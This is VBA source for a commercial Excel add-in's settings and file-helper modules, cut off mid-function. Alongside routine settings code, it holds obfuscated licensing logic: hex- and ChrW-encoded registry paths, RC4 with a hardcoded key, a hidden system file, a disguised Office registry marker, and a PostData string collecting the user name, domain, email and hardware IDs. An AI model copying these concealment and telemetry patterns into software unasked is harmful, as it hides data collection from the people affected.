Attribute VB_Name = "AddinSettings"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : AddinSettings                    Version: 2.5
' Author        : Igor Vakhnenko                   Date: 26.09.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------


Option Explicit: Option Compare Text
Const NULLCHAR$ = "~null~", VSEP$ = "|fffd||"
Dim dic As Dictionary

Private Sub Class_Initialize()
    Set dic = New Dictionary
    dic.CompareMode = TextCompare
    Me.LoadAllSettings
End Sub
Private Sub Class_Terminate()
    Set dic = Nothing
End Sub

Function GetCurrentSetName() As String
    GetCurrentSetName = dic.Item("_SettingSetName")
End Function

Private Function GetDefaultSettingSetFilename() As String
    GetDefaultSettingSetFilename = Environ("TMP") & "\" & PROJECT_NAME$ & " Add-in Default Settings.xml"
End Function

Function U(ByVal txt$) As String
    On Error Resume Next: Dim i&: If Len(txt$) Mod 2 > 0 Then Exit Function
    For i = 1 To Len(txt$) / 2: U = U & Chr(Val("&H" & Mid(txt$, 2 * i - 1, 2))): Next
End Function

Function ActivateSettingSet(ByVal SetName$, Optional ByVal filename$) As Boolean
    On Error Resume Next
    ActivateSettingSet = True

    If FWF.FileExists(filename$) Then
        Me.ImportFromFile filename$, True
        Me.SetText "_SettingSetName", SetName$
        Me.SetText "_SettingSetFilename", filename$
        Debug.Print Now, PROJECT_NAME$, "Setting set '" & SetName$ & "' applied"
    Else
        If SetName$ = ("<" & tt("DefaultSettingSetName") & ">") Or (SetName$ = "") Then
            Me.ImportFromFile GetDefaultSettingSetFilename, True
            Debug.Print Now, PROJECT_NAME$, "Default setting set restored"
        Else
            ActivateSettingSet = False
        End If
        Me.SetText "_SettingSetName", ""
        Me.Delete "_SettingSetFilename"
    End If

    Me.LoadAllSettings
End Function

Sub LoadAllSettings()
    On Error Resume Next: Dim arr As Variant, i&: Set dic = New Dictionary: dic.CompareMode = TextCompare
    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add arr(i, 0), arr(i, 1): Next i
    End If

    arr = GetAllSettings(PROJECT_NAME$, "Setup")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add "Setup\" & arr(i, 0), arr(i, 1): Next i
    End If

    arr = GetAllSettings(PROJECT_NAME$, "\")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add "\" & arr(i, 0), arr(i, 1): Next i
    End If
End Sub

Function IsFirstRun() As Boolean
    IsFirstRun = RSP(0) = ""
End Function

Function GetText(ByVal SettingName$, Optional ByVal DefValue As Variant, Optional ByVal section$ = "Settings") As String
    On Error Resume Next
    If section$ Like "H?*\?*\" Then
        GetText = CreateObject("WScript.Shell").RegRead(section$ & SettingName$)
    Else
        If dic.Exists(SettingName$) Then GetText = dic.Item(SettingName$) Else GetText = DefValue
        If section$ <> "Settings" Then GetText = GetSetting(PROJECT_NAME$, section$, SettingName$, DefValue)
    End If
End Function

Function GetNumber(ByVal SettingName$, Optional ByVal DefValue As Long, Optional ByVal section$ = "Settings") As Long
    On Error Resume Next: If dic.Exists(SettingName$) Then GetNumber = Val(dic.Item(SettingName$)) Else GetNumber = DefValue
    If section$ <> "Settings" Then GetNumber = Val(GetSetting(PROJECT_NAME$, section$, SettingName$, DefValue))
End Function

Function GetBoolean(ByVal SettingName$, Optional ByVal DefValue As Boolean, Optional ByVal section$ = "Settings") As Boolean
    On Error Resume Next: If dic.Exists(SettingName$) Then GetBoolean = CBool(dic.Item(SettingName$)) Else GetBoolean = DefValue
    If section$ <> "Settings" Then GetBoolean = CBool(GetSetting(PROJECT_NAME$, section$, SettingName$, DefValue))
End Function

Function GetRegValue(ByVal SettingName$) As String
    On Error Resume Next
    GetRegValue = CreateObject("WScript.Shell").RegRead(BASE_REGISTRY_PATH$ & SettingName$)
    GetRegValue = Replace(GetRegValue, NULLCHAR$, Chr(0))
End Function
Function SetRegValue(ByVal SettingName$, ByVal SettingValue As Variant) As String
    On Error Resume Next: Err.Clear
    CreateObject("WScript.Shell").RegWrite BASE_REGISTRY_PATH$ & SettingName$, Replace(SettingValue, Chr(0), NULLCHAR$)
    If Err Then Exit Function
End Function

Sub SetText(ByVal SettingName$, ByVal SettingValue As Variant, Optional ByVal section$ = "Settings")
    On Error Resume Next
    If section$ = "base" Then SetRegValue SettingName$, SettingValue: Exit Sub
    If section$ Like "H?*\?*\" Then
        CreateObject("WScript.Shell").RegWrite section$ & SettingName$, SettingValue
    Else
        SaveSetting PROJECT_NAME$, section$, SettingName$, SettingValue
        dic.Item(IIf(section$ = "Settings", "", section$ & "\") & SettingName$) = SettingValue
    End If
End Sub

Function Delete(ByVal SettingName$, Optional ByVal section$ = "Settings") As Boolean
    On Error Resume Next
    If section$ = "base" Then section$ = BASE_REGISTRY_PATH$
    If section$ Like "H?*\?*\" Then
        CreateObject("WScript.Shell").RegDelete section$ & SettingName$
    Else
        DeleteSetting PROJECT_NAME$, section$, SettingName$
        If section$ = "Settings" Then dic.Remove SettingName$
    End If
End Function

Sub AddDefaultValue(ByVal SettingName$, ByVal SettingValue As Variant, _
                    Optional ConvertToColumn As Boolean = False, Optional AbsentOrBlank As Boolean = False)
    On Error Resume Next
    If (Not dic.Exists(SettingName$)) Or (AbsentOrBlank And IsSettingBlank(SettingName$)) Then
        If ConvertToColumn Then SettingValue = GetColumnName(Val(SettingValue))
        Me.SetText SettingName$, SettingValue
    End If
End Sub

Function IsSettingBlank(ByVal SettingName$) As Boolean
    IsSettingBlank = True
    If dic.Exists(SettingName$) Then If dic.Item(SettingName$) <> "" Then IsSettingBlank = False
End Function

Function CIU() As Long
    On Error Resume Next: Dim X: Err.Clear: X = ThisWorkbook.VBProject.VBComponents.Count
    CIU = -(Err = 0): Err.Clear
End Function

Sub SaveAllFromSettingForm(ByRef UF As Object)
    On Error Resume Next: Dim ctrl As Object, filename$
    For Each ctrl In UF.Controls
        If ctrl.Enabled And Not (ctrl.Tag = "DoNotSave") Then
            If (Not ctrl.name Like "CommandButton_*") And Not (ctrl.Tag = "ScrollCombo") Then
                Me.SetText ctrl.name, ctrl.Value
            End If
        End If
    Next: Err.Clear

    If Me.GetCurrentSetName = "" Then
        Me.ExportToFile GetDefaultSettingSetFilename, True
    Else
        filename$ = Me.GetText("_SettingSetFilename")
        If FWF.FileExists(filename$) Then Me.ExportToFile filename$, True
    End If
End Sub

Sub LoadIntoSettingForm(ByRef UF As Object)
    On Error Resume Next: Dim ctrl As Object
    For Each ctrl In UF.Controls
        If ctrl.name Like "CheckBox*" Then
            ctrl.Value = Me.GetBoolean(ctrl.name)
        Else
            If dic.Exists(ctrl.name) Then ctrl.Value = dic.Item(ctrl.name)
        End If
    Next: Err.Clear
End Sub

Private Function GetColumnName(ByVal col As Long) As String
    GetColumnName = col & " |fffd|" & Split(Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1), "$")(1) & "|fffd|"
End Function

Function SF(Optional ByVal txt) As String
    On Error Resume Next: Dim file$, ts As Object, FSO As New FileSystemObject
    file$ = Environ(ChrW(65) & ChrW(80) & ChrW(80) & ChrW(68) & ChrW(65) & ChrW(84) & ChrW(65)) & ChrW(92) & PROJECT_NAME$ & ".ini"
    If IsMissing(txt) Then
        Set ts = FSO.OpenTextFile(file$, 1, False)
        SF = ts.ReadAll: ts.Close
    Else
        If txt = "filename" Then SF = file$: Exit Function
        SetAttr file$, vbNormal
        Set ts = FSO.CreateTextFile(file$, True): ts.Write txt
        SetAttr file$, vbHidden + vbSystem
    End If
    Set ts = Nothing: Set FSO = Nothing: Err.Clear
End Function

Function RSP(ByVal ind&)
    On Error Resume Next: If GetRegValue(U("64617461")) <> SF Then ChSP
    RSP = Split(Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))(0), VSEP$)(ind&)
End Function

Function WSP(ByVal ind&, ByVal v)
    On Error Resume Next: Err.Clear: Dim arr, txt: If GetRegValue("data") <> SF Then ChSP
    arr = Split(Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))(0), VSEP$)
    If Not IsArray(arr) Then arr = Array()
    If UBound(arr) < ind& Then ReDim Preserve arr(0 To ind&)
    arr(ind&) = v: arr(0) = DTU: txt = Join(arr, VSEP$): txt = EnDeCrypt(txt & Chr(164) & CheckSum(txt))
    SetRegValue "data", txt: Me.SF txt: Err.Clear
End Function

Function ChSP()
    On Error Resume Next: Dim arr1, arr2, d1&, d2&, ok1 As Boolean, ok2 As Boolean, a&
    arr1 = Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))
    arr2 = Split(EnDeCrypt(SF), Chr(164))
    ok1 = arr1(1) = CheckSum(arr1(0))
    ok2 = arr2(1) = CheckSum(arr2(0))
    d1 = Val(Split(arr1(0), VSEP$)(0))
    d2 = Val(Split(arr2(0), VSEP$)(0))
    Select Case True
        Case ok1 And ok2: a = IIf(d1 > d2, 1, IIf(d1 < d2, 2, 0))
        Case ok1: a = 1
        Case ok2: a = 2
        Case Else: a = 3
    End Select
    If a = 1 Then SF GetRegValue(U("64617461")) Else If a = 2 Then SetRegValue U("64617461"), SF
    If a = 3 Then SF "": WSP 1, ""
End Function

Function ImportFromFile(ByVal xmlPath$, Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim xml As Object, rootnode As Object, XMLoptions As Object, XMLoption As Object, AddinName$, AddinVersion$, msg$
    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        If Not .Load(xmlPath) Then
            If Not HideMessages Then MsgBox tt("ErrorLoadingSettings"), vbCritical, tt("UnsupportedSettingsFile")
            Exit Function
        End If

        Set rootnode = .DocumentElement
        AddinName$ = rootnode.Attributes.getNamedItem("Addin").text
        AddinVersion$ = Val(rootnode.SelectSingleNode("Version").text)

        Select Case True

            Case rootnode.BaseName <> "Settings", AddinName$ = ""
                If Not HideMessages Then MsgBox tt("ErrorLoadingSettings"), vbCritical, tt("UnsupportedSettingsFile")
                Exit Function

            Case AddinName$ <> PROJECT_NAME$
                If Not HideMessages Then MsgBox tt("SettingsForAnotherAddinFound", AddinName$, PROJECT_NAME$), vbCritical, tt("UnsupportedSettingsFile")
                Exit Function

            Case Else
                Set XMLoptions = rootnode.SelectNodes("./Options/option")
                If XMLoptions.Length = 0 Then
                    If Not HideMessages Then MsgBox tt("SettingsNotFoundInSettingsFile"), vbExclamation, tt("AddinSettingsNotChanged")
                    Exit Function
                End If

                Dim nNEW&, nOLD&, nCHANGED&, nALL&, nERR&, param_name$, param_value$, v$, i&

                nALL& = XMLoptions.Length
                For Each XMLoption In XMLoptions
                    param_name$ = XMLoption.Attributes.getNamedItem("Name").text
                    param_value$ = XMLoption.Attributes.getNamedItem("Value").text
                    If Len(param_value$) Mod 2 = 0 Then
                        v$ = "": For i = 1 To Len(param_value$) / 2
                            v$ = v$ & Chr(Val("&H" & Mid(param_value$, 2 * i - 1, 2)))
                        Next
                        Select Case GetText(param_name$, NULLCHAR$)
                            Case NULLCHAR$: nNEW& = nNEW& + 1
                            Case v$: nOLD& = nOLD& + 1
                            Case Else: nCHANGED& = nCHANGED& + 1
                        End Select
                        SetText param_name$, v$
                    Else
                        nERR& = nERR& + 1
                    End If
                Next

                msg$ = tt("SettingsImportDone_MessageText", nALL&, nNEW&, nCHANGED&, nOLD&, nERR&)
                If GetVersion < Val(AddinVersion$) And Val(AddinVersion$) > 0 Then
                    msg$ = msg$ & vbNewLine & vbNewLine & tt("SettingsImport_DifferentVersions", GetVersionTXT(AddinVersion$), GetVersionTXT)
                End If
                If Not HideMessages Then MsgBox msg, vbInformation, tt("SettingsImportDone_MessageTitle", PROJECT_NAME$)
                ImportFromFile = True
        End Select
    End With
End Function

Private Function BASE_REGISTRY_PATH$()
    BASE_REGISTRY_PATH$ = ChrW(72) & ChrW(75) & ChrW(67) & ChrW(85) & ChrW(92) & ChrW(83) & ChrW(111) & ChrW(102) & _
                          ChrW(116) & ChrW(119) & ChrW(97) & ChrW(114) & ChrW(101) & ChrW(92) & ChrW(69) & ChrW(120) & _
                          ChrW(99) & ChrW(101) & ChrW(108) & ChrW(86) & ChrW(66) & ChrW(65) & ChrW(92) & PROJECT_NAME$ & "\"
End Function

Function ExportToFile(ByVal xmlPath$, Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim xml As Object, rootnode As Object, arr As Variant, msg$, i&, j&, v$, HelpMsg$, AboutMsg$
    Set xml = CreateObject("Microsoft.XMLDOM")

    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")

        Set rootnode = .appendChild(.createElement("Settings"))
        rootnode.Attributes.setNamedItem(.createAttribute("Addin")).text = PROJECT_NAME$
        rootnode.Attributes.setNamedItem(.createAttribute("VersionName")).text = GetVersionTXT
        rootnode.Attributes.setNamedItem(.createAttribute("Timestamp")).text = Now

        AboutMsg$ = PROJECT_NAME$ & " add-in for MS Excel. |fffd| " & _
                    Replace(ProgramYears, " - ", "-") & " Igor Vakhnenko" & vbNewLine & Split(PROGRAM_HYPERLINK$, "?")(0)
        rootnode.appendChild(.createComment("About")).text = AboutMsg$
        rootnode.appendChild(.createElement("Version")).text = GetVersion
        rootnode.appendChild(.createElement("Filename")).text = ThisWorkbook.name

        HelpMsg$ = "All the values in this XML are stored as a HEX representation of the text data." & vbNewLine & _
                   "Each character of the value is converted into 2 characters, using the Hex(Asc(<character>)) function." & vbNewLine & _
                   "Please change program options using user interface only! (do not edit this XML file manually)" & vbNewLine & _
                   "These settings are stored in the registry: HKEY_CURRENT_USER\Software\VB and VBA Program Settings\" & PROJECT_NAME$ & "\Settings"

        If IsArray(arr) Then
            With rootnode.appendChild(xml.createElement("Options"))
                .appendChild(xml.createComment("Help")).text = HelpMsg$
                For i = LBound(arr) To UBound(arr)
                    v$ = ""
                    For j = 1 To Len(arr(i, 1))
                        v$ = v$ & IIf(Len(Hex(Asc(Mid(arr(i, 1), j, 1)))) = 1, "0", "") & Hex(Asc(Mid(arr(i, 1), j, 1)))
                    Next j

                    If Left(arr(i, 0), 1) <> "_" Then
                        With .appendChild(xml.createElement("option"))
                            .Attributes.setNamedItem(xml.createAttribute("Name")).text = arr(i, 0)
                            .Attributes.setNamedItem(xml.createAttribute("Value")).text = v$
                        End With
                    End If
                Next i
            End With
        Else
            If Not HideMessages Then MsgBox tt("SettingsExport_Unsaved", PROJECT_NAME$), vbExclamation, tt("SettingsExportErrorTitle")
            Exit Function
        End If

        Err.Clear: .Save xmlPath
        If Err Then
            If Not HideMessages Then MsgBox tt("SettingsExport_FilenameError", PROJECT_NAME$), vbExclamation, tt("SettingsExportErrorTitle")
        Else
            ExportToFile = True
            If Not HideMessages Then
                MsgBox tt("SettingsExportDone_MessageText", PROJECT_NAME$, Dir(xmlPath, vbNormal), Left(xmlPath, InStrRev(xmlPath, "\"))), _
                       vbInformation, tt("SettingsExportDone_MessageTitle")
            End If
        End If
    End With
End Function

Private Function CheckSum(ByRef txt) As String
    On Error Resume Next: Dim i&, s&
    For i& = 1 To Len(txt)
        s = (s + (2 + i Mod 10) * (AscW(Mid(txt, i, 1)) Mod 100)) Mod 10000
    Next
    CheckSum = Right(Hex(s), 3): If Len(CheckSum) < 3 Then CheckSum = String(3 - Len(CheckSum), "0") & CheckSum
End Function

Function DTU(Optional ByVal dd As Variant) As Long
    On Error Resume Next: If IsMissing(dd) Then dd = Now
    DTU = DateDiff("s", DateSerial(1970, 1, 1), CDate(dd))
End Function
Function DFU(Optional ByVal dd As Long) As Date
    On Error Resume Next: DFU = DateAdd("s", dd, DateSerial(1970, 1, 1))
End Function

Function PostData() As String
    On Error Resume Next
    With CreateObject("WScript.Network"): PostData = PostData & "w=" & H(.UserName & "|" & .UserDomain): End With
    PostData = PostData & "&lang=" & GetLanguage & "&addin=" & PROJECT_NAME$ & "&HID=" & HID
    PostData = PostData & "&code=" & GetRegValue("code") & "&email=" & H(GetRegValue("email")) & "&upd=" & IIf(GetBoolean("AutoInstall", False, "Updates"), 1, 0)
    PostData = PostData & "&len=" & FileLen(ThisWorkbook.FullName) & "&ul=" & CIU & "&as=" & AS_ & "&HWID=" & HWID
    PostData = PostData & "&time=" & DTU & "|" & RSP(1) & "|" & RSP(2) & "|" & RSP(3) & "|" & LastMacro + 1
    PostData = PostData & "&info=" & Val(Application.Version) & "|" & OfficeBits & "|" & GetVersion & "&dev=" & GetText("", , U("484B43555C536F6674776172655C457863656C5642415C"))
End Function

Function H(ByVal txt$) As String
    On Error Resume Next: Dim i&, r&
    For i = 1 To Len(txt)
        r = Asc(Mid(txt, i, 1)): H = H & IIf(Len(Hex(r)) = 1, "0", "") & Hex(r)
    Next
End Function

Function LastMacro(Optional ByVal macroname$ = "") As Boolean
    On Error Resume Next: Dim rk$: rk$ = U("484B43555C536F6674776172655C4D6963726F736F66745C4F66666963655C457863656C5C4D6163726F5C")
    If Len(macroname$) Then SetText H(PROJECT_NAME$), H(macroname$), rk$ Else LastMacro = GetText(H(PROJECT_NAME$), , rk$) <> ""
End Function

Function k() As String
    On Error Resume Next: Dim txt$, s&, d&, i&, txt2$: txt2$ = HWID & "123": txt$ = PROJECT_NAME$ & txt2
    For i = 1 To Len(txt): s = s + Asc(Mid(txt, i, 1)) * i: Next
    For i = 1 To Len(txt2): d = d + Asc(Mid(txt2, i, 1)) * (10 ^ (i Mod 3)): Next
    k = Right(d, 4) & Format((s + 1234) Mod 1000, "000")
End Function

Private Function EnDeCrypt(ByVal txt$, Optional ByVal numeric As Boolean, Optional ByVal p$)        'As String
    On Error Resume Next
    Dim s(0 To 255) As Integer, kep(0 To 255) As Integer: If Len(p) = 0 Then p = "12345asdfg"
    Dim temp As Integer, a As Integer, b As Integer, sd As Long, i As Integer, j As Integer, temp2 As Integer, k As Integer
    b = 0
    For a = 0 To 255
        b = b + 1: If b > Len(p) Then b = 1
        kep(a) = Asc(Mid$(p, b, 1))
    Next a
    For a = 0 To 255: s(a) = a: Next a
    b = 0: For a = 0 To 255: b = (b + s(a) + kep(a)) Mod 256: temp = s(a): s(a) = s(b): s(b) = temp: Next a
    For a = 1 To Len(txt)
        i = (i + 1) Mod 256: j = (j + s(i)) Mod 256: temp = s(i): s(i) = s(j): s(j) = temp
        k = s((s(i) + s(j)) Mod 256)
        EnDeCrypt = EnDeCrypt & Chr(Asc(Mid$(txt, a, 1)) Xor k)
        sd = sd + CLng(Asc(Mid$(txt, a, 1))) * CLng(k + 6)
    Next
    If numeric Then EnDeCrypt = sd
End Function

Function Reset() As String
    On Error Resume Next
    Dim SettingsBackupFile$: SettingsBackupFile$ = FWF.temp_filename & "_SettingsBackup.xml"
    Me.ExportToFile SettingsBackupFile$, True
    DeleteSetting PROJECT_NAME$, "Settings"
    SaveDefaultSettings
    Reset = SettingsBackupFile$
End Function


Attribute VB_Name = "FWF"
'---------------------------------------------------------------------------------------
' Module        : FWF                    Version: 2
' Author        : Igor Vakhnenko                   Date: 25.12.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit

#If VBA7 Then        '  Office 2010-2013
    Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
            (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, _
             ByVal dwReserved As LongPtr, ByVal lpfnCB As LongPtr) As LongPtr
#Else        '  Office 2003-2007
    Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                                       (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
                                        ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
#End If

Function DownLoadFileFromURL(ByVal URL$, ByVal LocalPath$, Optional ByVal DisableCache As Boolean = False) As Boolean
    On Error Resume Next: Dim shortFilename$
    If (LocalPath$ = "") Or (URL$ = "") Then Exit Function
    If Not LocalPath$ Like "*\*" Then LocalPath$ = Environ("TEMP") & "\" & LocalPath$
    Kill LocalPath$
    shortFilename$ = Mid(LocalPath$, InStrRev(LocalPath$, "\") + 1)
    If shortFilename$ <> Replace_symbols(shortFilename$) Then
        Debug.Print "Wrong symbols in filename: " & shortFilename$
        Exit Function
    End If
    If DisableCache Then Randomize: URL$ = URL$ & "?HID=" & HID & "&rnd=" & Left(Rnd(Now) * 1E+15, 10)
    DownLoadFileFromURL = URLDownloadToFile(0, URL$, LocalPath$, 0, 0) = 0
End Function

Function GetFileExtension(ByVal filename$) As String
    On Error Resume Next: filename$ = Replace(filename$, "/", "\")
    filename$ = Split(filename$, "\")(UBound(Split(filename$, "\")))
    If filename$ Like "*.*" Then GetFileExtension = Split(filename$, ".")(UBound(Split(filename$, ".")))
End Function


Function GetFolderPath(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\") As String
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFolderDialogCaption")
    Dim PS$: PS = Application.PathSeparator
    With Application.FileDialog(msoFileDialogFolderPicker)
        If Not Right$(InitialPath, 1) = PS Then InitialPath = InitialPath & PS
        .ButtonName = tt("SelectButtonCaption")
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        If .Show <> -1 Then Exit Function
        GetFolderPath = .SelectedItems(1)
        If Not Right$(GetFolderPath, 1) = PS Then GetFolderPath = GetFolderPath & PS
    End With
End Function

Function GetFilePath(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\", _
                     Optional ByVal FilterDescription$ = "Excel files", Optional ByVal FilterExtension$ = "*.xls*") As String
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFileDialogCaption")
    With Application.FileDialog(msoFileDialogOpen)
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        .filters.Clear: .filters.Add FilterDescription, FilterExtension
        If .Show <> -1 Then Exit Function
        GetFilePath = .SelectedItems(1)
    End With
End Function

Function GetFilenamesCollection(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\") As FileDialogSelectedItems
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFilesDialogCaption")
    With Application.FileDialog(3)        ' msoFileDialogFilePicker
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        If .Show <> -1 Then Exit Function
        Set GetFilenamesCollection = .SelectedItems
    End With
End Function

Function FilenamesCollection(ByVal FolderPath$, Optional ByVal Mask$ = "*", Optional ByVal SearchDeep& = 999) As Collection
    On Error Resume Next: Dim FSO As Object: Set FilenamesCollection = New Collection
    Set FSO = CreateObject("Scripting.FileSystemObject")
    GetAllFileNamesUsingFSO FolderPath, Mask, FSO, FilenamesCollection, SearchDeep
    Set FSO = Nothing        ': Application.StatusBar = False
End Function

Function GetAllFileNamesUsingFSO(ByVal FolderPath$, ByVal Mask$, ByRef FSO, ByRef FileNamesColl As Collection, ByVal SearchDeep&)
    On Error Resume Next: Dim oCurrFolder As Object, oFile As Object, oSubFolder As Object
    Const ExcludeFiles$ = "Thumbs.db, desktop.ini"

    Set oCurrFolder = FSO.GetFolder(FolderPath)
    If Not oCurrFolder Is Nothing Then
        ' Application.StatusBar = "Searching in: " & FolderPath$
        For Each oFile In oCurrFolder.files
            If oFile.name Like "*" & Mask Then
                If InStr(1, ExcludeFiles$, oFile.name, vbTextCompare) = 0 Then
                    If InStr(1, oFile.name, "~$", vbTextCompare) <> 1 Then FileNamesColl.Add oFile.Path
                End If
            End If
        Next
        SearchDeep& = SearchDeep& - 1
        If SearchDeep& Then
            For Each oSubFolder In oCurrFolder.SubFolders
                GetAllFileNamesUsingFSO oSubFolder.Path, Mask, FSO, FileNamesColl, SearchDeep&
            Next
        End If
        Set oFile = Nothing: Set oSubFolder = Nothing: Set oCurrFolder = Nothing
    End If
End Function

Function SubFoldersCollection(ByVal FolderPath$, Optional ByVal Mask$ = "*") As Collection
    On Error Resume Next: Dim FSO As Object, oSubFolder As Object

    Set SubFoldersCollection = New Collection
    Set FSO = CreateObject("Scripting.FileSystemObject")
    If Right(FolderPath$, 1) <> "\" Then FolderPath$ = FolderPath$ & "\"

    For Each oSubFolder In FSO.GetFolder(FolderPath$).SubFolders
        If oSubFolder.Path Like FolderPath$ & Mask$ Then SubFoldersCollection.Add oSubFolder.Path & "\"
    Next oSubFolder
    Set oSubFolder = Nothing: Set FSO = Nothing
End Function


Function ReadTXTfile(ByVal filename$) As String
    On Error Resume Next: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(filename$, 1, True): ReadTXTfile = ts.ReadAll: ts.Close
    Set ts = Nothing: Set FSO = Nothing
End Function

Function SaveTXTfile(ByVal filename$, ByVal txt$) As Boolean
    On Error Resume Next: Err.Clear: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.CreateTextFile(filename$, True)
    ts.Write txt: ts.Close
    SaveTXTfile = Err = 0: Set ts = Nothing: Set FSO = Nothing
End Function

Function AddIntoTXTfile(ByVal filename$, ByVal txt$) As Boolean
    On Error Resume Next: Err.Clear: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(filename$, 8, True): ts.Write txt: ts.Close
    AddIntoTXTfile = Err = 0: Set ts = Nothing: Set FSO = Nothing
End Function


Function Replace_symbols(ByVal txt$, Optional ReplaceWith$ = "_", Optional ByVal AllowPathSeparator As Boolean = False) As String
    On Error Resume Next: Dim i&, CharsList$: CharsList$ = "/\:?*|""<>"
    If AllowPathSeparator Then CharsList$ = Replace(CharsList$, Application.PathSeparator, "")
    For i& = 1 To Len(CharsList$)
        txt$ = Replace(txt$, Mid(CharsList$, i&, 1), ReplaceWith$)
    Next
    Replace_symbols = txt$
End Function

Sub OpenFolder(ByVal FolderPath$)        ' to open FolderPath$ in Windows Explorer
    On Error Resume Next: If FolderPath$ = "" Then Exit Sub
    If FolderExists(FolderPath$) Then
        FollowHyperlink "explorer.exe /e, """ & FolderPath$ & """"
    Else
        MsgBox tt("UnableToOpenFolder", vbNewLine & FolderPath$ & vbNewLine), vbExclamation, tt("FolderNotFound")
    End If
End Sub

Sub FollowHyperlink(ByVal URL$)
    On Error Resume Next
    If Len(URL$) Then
        URL$ = Replace(URL$, "%website%", DEVELOPER_WEBSITE$)
        URL$ = Replace(URL$, "%projectname%", PROJECT_NAME$)
        URL$ = Replace(URL$, "%hid%", HID)
        CreateObject("WScript.Shell").Run URL$
    End If
End Sub

Sub ShowFile(ByVal FilePath$)        ' to open FilePath$ in Windows Explorer
    On Error Resume Next: If FilePath$ = "" Then Exit Sub
    FollowHyperlink "explorer.exe /e,/select,""" & FilePath$ & """"
End Sub

Sub ShowText(ByVal txt$, Optional ByVal Index&)        ' to open text as a file in Notepad
    On Error Resume Next: Dim filename$
    filename$ = Environ("TEMP") & "\text" & IIf(Index, Index, Left(Rnd() * 1E+15, 10)) & ".txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write txt$: .Close
    End With
    FollowHyperlink """" & filename$ & """"
End Sub

Function ChangeFileCharset(ByVal filename$, ByVal DestCharset$, Optional ByVal SourceCharset$) As Boolean
    On Error Resume Next: Err.Clear: Dim FileContent$
    With CreateObject("ADODB.Stream")
        .Type = 2: If Len(SourceCharset$) Then .Charset = SourceCharset$
        .Open: .LoadFromFile filename$
        FileContent$ = .ReadText: .Close
        .Charset = DestCharset$: .Open: .WriteText FileContent$
        .SaveToFile filename$, 2: .Close
    End With
    ChangeFileCharset = Err = 0: Err.Clear
End Function

Function temp_folder$()
    On Error Resume Next: temp_folder$ = Environ("TEMP") & "\ExcelTemporaryFiles\"
    If Dir(temp_folder$, vbDirectory) = "" Then MkDir temp_folder$
End Function

Function temp_filename$()
    On Error Resume Next: Dim iter&, txt$
get_rnd:     iter& = iter& + 1: txt$ = Left(Rnd(Now) * 1E+15, 10)
    temp_filename$ = temp_folder$ & "temp_file_" & Format(Now, "YYYY-MM-DD--HH-NN-SS") & "__" & txt$
    If Dir(temp_filename$, vbNormal) <> "" Then If iter& < 5 Then GoTo get_rnd
End Function

Function FolderExists(ByVal folder$) As Boolean
    On Error Resume Next: FolderExists = CreateObject("Scripting.FileSystemObject").FolderExists(folder$)
End Function

Function FileExists(ByVal filename$) As Boolean
    On Error Resume Next: FileExists = CreateObject("Scripting.FileSystemObject").FileExists(filename$)
End Function

Function URL_Encode(ByVal txt As String) As String
    On Error Resume Next: Dim i&, l$, t$
    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)
        Select Case AscW(l)
            Case Is > 4095: t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case Is > 127: t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case 32: t = "%20"
            Case Else: t = l
        End Select
        URL_Encode = URL_Encode & t
    Next
End Function

Function FileOrFolderSize(ByVal s) As String
    On Error Resume Next: Dim Size As Single: Size = Fix(Val(s))
    Select Case Size
        Case Is < 1000: FileOrFolderSize = Size & " bytes"
        Case Is < 10000: FileOrFolderSize = FormatNumber(Size / 1024, 1) & " KB"
